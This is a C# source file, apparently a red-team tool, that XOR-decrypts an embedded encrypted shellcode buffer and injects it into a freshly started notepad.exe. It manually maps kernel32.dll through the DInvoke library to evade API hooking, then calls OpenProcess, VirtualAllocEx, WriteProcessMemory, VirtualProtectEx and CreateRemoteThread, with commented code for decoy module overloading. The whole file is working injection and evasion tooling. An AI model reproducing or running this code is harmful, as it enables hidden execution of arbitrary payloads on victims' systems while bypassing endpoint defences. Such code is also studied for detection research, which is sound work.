﻿using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using DInvoke;

namespace dinvokemm
{
    public class dinvokemm
    {
        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("0x{0:x2},", b);
            return hex.ToString();
        }

        public static byte[] xorKey(byte[] sc, int scLength, byte[] key, int keyLength)
        {
            byte[] decryptedSC = new byte[510];
            int j = 0;

            for (int i = 0; i < scLength; i++)
            {
                if (j == keyLength - 1)
                {
                    j = 0;
                }

                decryptedSC[i] = (byte)(sc[i] ^ key[j]);
                j++;
            }
            return decryptedSC;
        }

        public static void banner()
        {
            Console.WriteLine(@"
# ======================================================================
# <<< DInvoke Manual Mapping >>>
# Platform: .NET 4 Framework
# DInvoke: Manual Mapping - kernel32.dll 
# ***Note***: .NET 3.5 or 3.0 also works. This can be ran in-memory because it's a .NET assembly.
# ======================================================================
");
        }

        public dinvokemm()
        {
            Execute();
        }

        public static void Main(string[] args)
        {
            new dinvokemm();
        }

        public void Execute()
        {
            banner();

            byte[] buf = new byte[510] {
0x91,0x25,0xe4,0x85,0x84,0x8d,0xbf,0x6d,0x6d,0x67,0x20,0x25,0x24,0x23,0x3f,0x25,0x56,0xb3,0x25,0x33,0x16,0x25,0xe6,0x35,0x01,0x3c,0xee,0x21,0x75,0x25,0xec,0x33,0x54,0x2d,0xf8,0x1f,0x3d,0x2a,0x50,0xbd,0x2d,0x7c,0xda,0x27,0x2d,0x29,0x45,0xa5,0xdf,0x51,0x0c,0x1b,0x63,0x58,0x45,0x32,0xac,0xa4,0x6a,0x20,0x75,0xa4,0x91,0x80,0x3f,0x26,0x30,0x3c,0xee,0x21,0x4d,0xe6,0x25,0x5d,0x3c,0x64,0xa3,0x0b,0xec,0x1f,0x79,0x7f,0x67,0x7c,0xe8,0x1f,0x67,0x61,0x74,0xee,0xf3,0xe5,0x6d,0x67,0x61,0x3c,0xe0,0xb3,0x19,0x0a,0x2f,0x60,0xa4,0x35,0xf8,0x25,0x75,0x23,0xea,0x34,0x45,0x3a,0x6c,0xbd,0x84,0x37,0x39,0x54,0xba,0x25,0x92,0xae,0x20,0xff,0x51,0xfb,0x25,0x6c,0xb1,0x29,0x45,0xa5,0x32,0xac,0xa4,0x6a,0xcd,0x35,0x64,0xb2,0x55,0x8d,0x12,0x90,0x38,0x66,0x3f,0x49,0x65,0x22,0x58,0xa5,0x10,0xab,0x35,0x29,0xec,0x21,0x50,0x2c,0x72,0xbd,0x0b,0x26,0xea,0x78,0x2d,0x37,0xe6,0x2d,0x7b,0x28,0x75,0xb5,0x32,0xe6,0x69,0xef,0x20,0x2c,0x2d,0x72,0xbd,0x2c,0x3f,0x3f,0x2d,0x3f,0x32,0x35,0x2c,0x3e,0x20,0x2e,0x2d,0xf0,0x81,0x4d,0x26,0x33,0x8b,0x85,0x2b,0x2c,0x34,0x3d,0x29,0xff,0x77,0x9a,0x26,0x92,0x98,0x9e,0x29,0x2c,0xcd,0x1a,0x1e,0x55,0x3e,0x47,0x57,0x73,0x6d,0x2c,0x31,0x28,0xfd,0x83,0x3b,0xec,0x81,0xc7,0x60,0x74,0x65,0x3a,0xe4,0x88,0x2e,0xdd,0x76,0x65,0x72,0xd6,0xad,0xcf,0x51,0x1b,0x24,0x27,0x24,0xe4,0x83,0x2d,0xfd,0x94,0x32,0xd7,0x21,0x10,0x47,0x73,0x9a,0xa6,0x21,0xe4,0x8d,0x09,0x75,0x64,0x73,0x6d,0x34,0x26,0xdb,0x5d,0xe5,0x18,0x6d,0x92,0xb2,0x0b,0x7e,0x24,0x2d,0x3d,0x3d,0x2a,0x50,0xbd,0x28,0x42,0xad,0x25,0x98,0xa1,0x3c,0xec,0xb1,0x25,0x92,0xa7,0x29,0xfd,0xa4,0x32,0xd7,0x87,0x68,0xbe,0x94,0x9a,0xa6,0x25,0xe4,0xa0,0x0b,0x64,0x24,0x2b,0x21,0xe4,0x85,0x29,0xfd,0x9c,0x32,0xd7,0xf4,0xc2,0x15,0x15,0x9a,0xa6,0xe8,0xad,0x13,0x6b,0x3d,0x9a,0xbd,0x18,0x88,0x8f,0xf2,0x74,0x65,0x73,0x25,0xee,0x8b,0x71,0x3c,0xec,0x91,0x20,0x5c,0xae,0x0b,0x70,0x24,0x2b,0x25,0xe4,0x9e,0x20,0xce,0x67,0xaa,0xa5,0x32,0x98,0xb4,0xf7,0x9d,0x73,0x13,0x38,0x2f,0xe2,0xb0,0x45,0x2d,0xe4,0x9b,0x0d,0x21,0x35,0x3c,0x1b,0x6d,0x7d,0x67,0x61,0x35,0x3d,0x3b,0xe4,0x9f,0x2f,0x50,0xbd,0x24,0xc9,0x35,0xc9,0x34,0x84,0x8b,0xb0,0x3b,0xe4,0xae,0x2e,0xe8,0xb3,0x28,0x42,0xa4,0x24,0xee,0x91,0x3c,0xec,0xa9,0x25,0xe4,0x9e,0x20,0xce,0x67,0xaa,0xa5,0x32,0x98,0xb4,0xf7,0x9d,0x73,0x10,0x45,0x3f,0x20,0x23,0x3c,0x1b,0x6d,0x2d,0x67,0x61,0x35,0x3d,0x19,0x6d,0x37,0x26,0xdb,0x7f,0x4a,0x7c,0x5d,0x92,0xb2,0x36,0x2d,0x24,0xc9,0x18,0x03,0x2a,0x00,0x8b,0xb0,0x3a,0x92,0xa3,0x8e,0x5d,0x8b,0x9a,0x8c,0x25,0x6c,0xa4,0x29,0x5d,0xa3,0x3b,0xe8,0x9b,0x12,0xd5,0x35,0x9a,0x94,0x35,0x07,0x67,0x38,0x3d,0xa2,0xb1,0x9d,0xd8,0xc5,0x37,0x8b,0xb0 };
            string key = "mmgatest";
            byte[] decryptedBuf = xorKey(buf, buf.Length, Encoding.ASCII.GetBytes(key), key.Length);
            byte[] sc = decryptedBuf;

            var process = Process.Start("C:\\Windows\\System32\\notepad.exe");
            var pid = (uint)process.Id;

            // 0. Manual Mapping of kernel32.dll + debugging messages
            DInvoke.Data.PE.PE_MANUAL_MAP kernelModule = DInvoke.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
            Console.WriteLine("[>] Module Base Addr - 0x{0}", kernelModule.ModuleBase.ToString("x2"));

            // 0. Use me for module overloading! 
            //DInvoke.Data.PE.PE_MANUAL_MAP kernelModule = DInvoke.ManualMap.Overload.OverloadModule("C:\\Windows\\System32\\kernel32.dll");
            //Console.WriteLine("[>] Using decoy module: " + kernelModule.DecoyModule);
            //Console.WriteLine("[>] Decoy module Addr: 0x" + kernelModule.ModuleBase.ToString("x2"));
            //Console.ReadLine();

            object[] openProcessParameters = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, pid };
            var hProc = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "OpenProcess", typeof(DInvoke.DynamicInvoke.Win32.Delegates.OpenProcess), openProcessParameters, false);
            Console.WriteLine("[>] Process handle: " + string.Format("0x{0:X}", hProc.ToInt64()) + "\n");

            Console.WriteLine("[+] VirtualAllocEx - Allocating memory to process");
            object[] vAllocParameters = { hProc, IntPtr.Zero, (uint)sc.Length, 0x1000 | 0x2000, 0x04 };
            var allocResult = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "VirtualAllocEx", typeof(DELEGATES.VirtualAllocEx), vAllocParameters);

            Console.WriteLine("[+] WriteProcessMemory - Moving shellcode to calculator");
            object[] wProcMemoryParameters = { hProc, allocResult, sc, sc.Length, IntPtr.Zero };
            var wProcMemoryResult = (bool)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "WriteProcessMemory", typeof(DELEGATES.WriteProcessMemory), wProcMemoryParameters);
            if (wProcMemoryResult)
            {
                Console.WriteLine("[+] Shellcode written in memory of notepad process: 0x{0}", allocResult.ToInt64().ToString("x2"));
            }

            Console.WriteLine("[+] VirtualProtectEx - Changing memory region to READ/EXECUTE permission");
            uint oldProtect = 0;
            object[] vProctectExParameters = { hProc, allocResult, (uint)sc.Length, (uint)0x20, oldProtect };
            var vProtectExResult = (bool)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "VirtualProtectEx", typeof(DELEGATES.VirtualProtectEx), vProctectExParameters);

            Console.WriteLine("[+] CreateRemoteThread - Starting thread on calculator");
            object[] cRemoteThreadParameters = { hProc, IntPtr.Zero, (UInt32)0, allocResult, IntPtr.Zero, (UInt32)0, IntPtr.Zero };
            var cRemoteThreadResult = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "CreateRemoteThread", typeof(DELEGATES.CreateRemoteThread), cRemoteThreadParameters);

            Console.WriteLine("\n" + "Press Enter to shut me down!");
            Console.ReadLine();
        }
    }

    public class DELEGATES
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Boolean CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, DInvoke.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref DInvoke.Data.Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo, out DInvoke.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, Int32 flAllocationType, Int32 flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlMoveMemory(HandleRef destData, HandleRef srcData, int size);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        // Becareful of uint dwSize 
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Boolean VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtec);

    }
}
